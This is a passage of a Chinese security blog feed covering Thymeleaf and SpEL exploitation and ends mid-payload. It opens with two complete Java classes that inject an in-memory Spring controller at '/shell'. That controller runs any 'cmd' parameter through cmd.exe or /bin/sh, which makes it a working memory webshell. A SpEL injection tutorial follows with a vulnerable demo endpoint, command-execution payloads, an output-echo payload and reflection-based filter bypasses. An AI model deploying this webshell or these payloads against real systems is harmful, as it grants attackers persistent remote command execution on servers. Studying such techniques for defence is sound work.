java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectToController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-comment">// 第一个构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectToController</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException &#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 2. 通过反射获得自定义 controller 中test的 Method 对象</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getMappingRegistry&quot;</span>);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 通过反射获得该类的test方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> InjectToController.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-comment">// 3. 定义访问 controller 的 URL 地址</span><br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><br>        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>        <span class="hljs-comment">// 5. 在内存中动态注册 controller</span><br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// 创建用于处理请求的对象，加入&quot;aaa&quot;参数是为了触发第二个构造函数避免无限循环</span><br>        <span class="hljs-type">InjectToController</span> <span class="hljs-variable">injectToController</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InjectToController</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        mappingHandlerMapping.registerMapping(info, injectToController, method2);<br>    &#125;<br>    <span class="hljs-comment">// 第二个构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectToController</span><span class="hljs-params">(String aaa)</span> &#123;&#125;<br><br>    <span class="hljs-comment">// controller指定的处理方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span>  IOException&#123;<br>        <span class="hljs-comment">// 获取request和response对象</span><br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br><br>        <span class="hljs-comment">//exec</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br>                java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next(): o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//当请求没有携带指定的参数(code)时，返回 404 错误</span><br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>&gt;&#x3D;2.6.0</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectToController2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectToController2</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">configField</span> <span class="hljs-operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);<br>            configField.setAccessible(<span class="hljs-literal">true</span>);<br>            RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> InjectToController2.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>            <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/shell&quot;</span>).options(config).build();<br>            <span class="hljs-type">InjectToController2</span> <span class="hljs-variable">springControllerMemShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InjectToController2</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectToController2</span><span class="hljs-params">(String aaa)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br>                java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.htm">https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.htm</a></p><p><a href="https://cn-sec.com/archives/3118198.html">https://cn-sec.com/archives/3118198.html</a></p><p><a href="https://forum.butian.net/share/1922">https://forum.butian.net/share/1922</a></p><p><a href="https://xz.aliyun.com/t/11688?time__1311=Cq0xRQKQq7qmqGNDQiiQqPGI3oLfObQWa4D">https://xz.aliyun.com/t/11688?time__1311=Cq0xRQKQq7qmqGNDQiiQqPGI3oLfObQWa4D</a></p><p><a href="http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;再来水一篇Thymeleaf的ssti，起因是看到师兄以前出的题目，里面有一点小坑，索引就把Thymeleaf稍微高版本一些的漏洞再记录一下&lt;/p&gt;
&lt;h1 id=&quot;thymeleaf高版本利用&quot;&gt;&lt;a href=&quot;#thymeleaf高版本利用&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>SPEL表达式注入</title>
    <link href="https://clowsman.github.io/2024/12/14/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <id>https://clowsman.github.io/2024/12/14/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</id>
    <published>2024-12-13T17:37:45.000Z</published>
    <updated>2024-12-14T06:39:43.069Z</updated>
    
    <content type="html"><![CDATA[<p>赶紧来补一下SPEL表达式注入，前面Thymeleaf本质用的就是SPEL表达式</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Spring表达式语言（简称 <strong>SpEL</strong>，全称<strong>Spring Expression Language</strong>）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。</p><h1 id="demo示例"><a href="#Demo示例" class="headerlink" title="Demo示例"></a>Demo示例</h1><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller.spel;<br><br><br><span class="hljs-keyword">import</span> org.springframework.expression.Expression;<br><span class="hljs-keyword">import</span> org.springframework.expression.ExpressionParser;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpElController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/spelTest&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">catUser</span><span class="hljs-params">(String message)</span> &#123;<br>        <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(message);<br>        <span class="hljs-keyword">return</span> expression.getValue().toString(); <span class="hljs-comment">//获取表达式执行的结果</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>比如我们传一个生成随机数的表达式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/spelTest?message=T(java.lang.Math).random()*100<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241214130112061.png" alt="image-20241214130112061"></p><p>下面的形式可以直接执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/spelTest?message=new%20java.lang.ProcessBuilder(%22whoami%22).start() <br></code></pre></td></tr></table></figure><h1 id="spel语法"><a href="#SpEl语法" class="headerlink" title="SpEl语法"></a>SpEl语法</h1><p>spel用<code>#&#123;...&#125;</code>作为界定符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法</p><ul><li>引用其他对象:<code>#&#123;car&#125;</code></li><li>引用其他对象的属性：<code>#&#123;car.brand&#125;</code></li><li>调用其它方法 , 还可以链式操作：<code>#&#123;car.toString()&#125;</code></li></ul><p>其中属性名称引用还可以用<code>$</code>符号 如：<code>$&#123;someProperty&#125;</code></p><blockquote><p>这里需要注意#{}和${}的区别：</p><ul><li>#{}就是SpEL的定界符，用于指明内容未SpEL表达式并执行；</li><li>${}主要用于加载外部属性文件中的值；</li><li>两者可以混合使用，但是必须#{}在外面，${}在里面，如#{‘${}’}，注意单引号是字符串类型才添加的；</li></ul></blockquote><p>除此以外在SpEL中，使用<code>T()</code>运算符会调用类作用域的方法和常量，想使用某个类就可以像前面的demo一样</p><p>注意除了java.lang包下的类，其他类都要用全类名的形式。</p><p><strong>各种操作符</strong></p><p>前面我们将输入的参数直接当成SpEL表达式去执行的，所以没有输入<code>#&#123;&#125;</code>，但是如果用@Value去获取值执行就需要了，下面是一些表达式示例：</p><p><strong>算术运算</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//除法和模运算具有字母别名，div代表/，mod代表％。 +运算符还可用于连接字符串。</span><br><span class="hljs-meta">@Value(&quot;#&#123;&#x27;string1&#x27;+&#x27;string2&#x27;&#125;&quot;)</span> <span class="hljs-comment">//字符串拼接</span><br><span class="hljs-keyword">private</span> String name;<br><br><span class="hljs-meta">@Value(&quot;#&#123;(2 + 2) * 2 + 9&#125;&quot;)</span> <span class="hljs-comment">// 17  表达式计算</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">double</span> brackets;<br></code></pre></td></tr></table></figure><p><strong>关系和逻辑操作</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;1 == 1&#125;&quot;)</span> <span class="hljs-comment">// true</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> equal;<br><br><span class="hljs-meta">@Value(&quot;#&#123;1 eq 1&#125;&quot;)</span> <span class="hljs-comment">// true</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> equalAlphabetic;<br></code></pre></td></tr></table></figure><p><strong>条件运算</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;2 &gt; 1 ? &#x27;a&#x27; : &#x27;b&#x27;&#125;&quot;)</span> <span class="hljs-comment">// &quot;a&quot;</span><br><span class="hljs-keyword">private</span> String ternary;<br></code></pre></td></tr></table></figure><p><strong>使用正则表达式</strong></p><p><code>matchs</code>运算符可用于检查字符串是否与给定的正则表达式匹配。</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;&#x27;100fghdjf&#x27; matches &#x27;\\d+&#x27; &#125;&quot;)</span> <span class="hljs-comment">// false</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> invalidNumericStringResult;<br><br><span class="hljs-meta">@Value(&quot;#&#123;&#x27;valid alphabetic string&#x27; matches &#x27;[a-zA-Z\\s]+&#x27; &#125;&quot;)</span> <span class="hljs-comment">// true</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> validAlphabeticStringResult;<br></code></pre></td></tr></table></figure><p><strong>访问List和Map对象</strong></p><p>我们可以访问上下文中任何Map或List的值</p><p>比如这里创建一个bean</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component(&quot;workersHolder&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WorkersHolder</span> &#123;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; workers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> Map&lt;String, Integer&gt; salaryByWorkers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">WorkersHolder</span><span class="hljs-params">()</span> &#123;<br>        workers.add(<span class="hljs-string">&quot;John&quot;</span>);<br>        workers.add(<span class="hljs-string">&quot;Susie&quot;</span>);<br>        workers.add(<span class="hljs-string">&quot;Alex&quot;</span>);<br>        workers.add(<span class="hljs-string">&quot;George&quot;</span>);<br><br>        salaryByWorkers.put(<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-number">35000</span>);<br>        salaryByWorkers.put(<span class="hljs-string">&quot;Susie&quot;</span>, <span class="hljs-number">47000</span>);<br>        salaryByWorkers.put(<span class="hljs-string">&quot;Alex&quot;</span>, <span class="hljs-number">12000</span>);<br>        salaryByWorkers.put(<span class="hljs-string">&quot;George&quot;</span>, <span class="hljs-number">14000</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//Getters and setters</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后访问其中的值</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.salaryByWorkers[&#x27;John&#x27;]&#125;&quot;)</span> <span class="hljs-comment">// 35000</span><br><span class="hljs-keyword">private</span> Integer johnSalary;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.salaryByWorkers[&#x27;George&#x27;]&#125;&quot;)</span> <span class="hljs-comment">// 14000</span><br><span class="hljs-keyword">private</span> Integer georgeSalary;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.salaryByWorkers[&#x27;Susie&#x27;]&#125;&quot;)</span> <span class="hljs-comment">// 47000</span><br><span class="hljs-keyword">private</span> Integer susieSalary;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.workers[0]&#125;&quot;)</span> <span class="hljs-comment">// John</span><br><span class="hljs-keyword">private</span> String firstWorker;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.workers[3]&#125;&quot;)</span> <span class="hljs-comment">// George</span><br><span class="hljs-keyword">private</span> String lastWorker;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.workers.size()&#125;&quot;)</span> <span class="hljs-comment">// 4</span><br><span class="hljs-keyword">private</span> Integer numberOfWorkers;<br></code></pre></td></tr></table></figure><p><strong>$界定符</strong></p><p>可以访问application.properties文件的属性值</p><p><img src="https://cdn.clown2024.cn/image-20241214135525790.png" alt="image-20241214135525790"></p><h1 id="spel表达式注入漏洞"><a href="#SpEl表达式注入漏洞" class="headerlink" title="SpEl表达式注入漏洞"></a>SpEl表达式注入漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Spring提供了两个EvaluationContext：<code>SimpleEvaluationContext</code>和<code>StandardEvaluationContext</code>：</p><ul><li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li><li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li></ul><p>然后Spring默认采用的就是StandardEvaluationContext，我们自己去调试一下就可以知道，在前面demo代码中执行getValue方法获取表达式结果返回的过程中会给context赋值，如下图</p><p><img src="https://cdn.clown2024.cn/image-20241214140834474.png" alt="image-20241214140834474"></p><h2 id="常用payload整理"><a href="#常用payload整理" class="headerlink" title="常用payload整理"></a>常用payload整理</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-number">12</span>*<span class="hljs-number">12</span>&#125;<br>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;open -na Calculator&quot;</span>)<br>T(Thread).sleep(<span class="hljs-number">10000</span>)<br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().exec(<span class="hljs-string">&#x27;calc.exe&#x27;</span>)<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-string">&#x27;open -na Calculator&#x27;</span>).start()<br></code></pre></td></tr></table></figure><p><strong>回显</strong></p><p>还学到一个利用org.apache.commons.io进行回显的操作</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream())<br></code></pre></td></tr></table></figure><p>但前提是引入了commons-io的依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.11.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>绕过</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//反射绕过</span><br>T(String).class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>).exec(<span class="hljs-string">&quot;open%20-na%20Calculator&quot;</span>)<br><br><span class="hljs-comment">// + 一定要用url编码，不然浏览器解析会有问题</span><br>T(String).class.forName(<span class="hljs-string">&quot;java.lang.Ru&quot;</span>%2b<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>%2b<span class="hljs-string">&quot;ntime&quot;</span>).invoke(<span class="hljs-literal">null</span>).exec(<span class="hljs-string">&quot;open%20-na%20Calculator&quot;</span>)<br><br>T(String).getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>).getClass().getMethod(<span 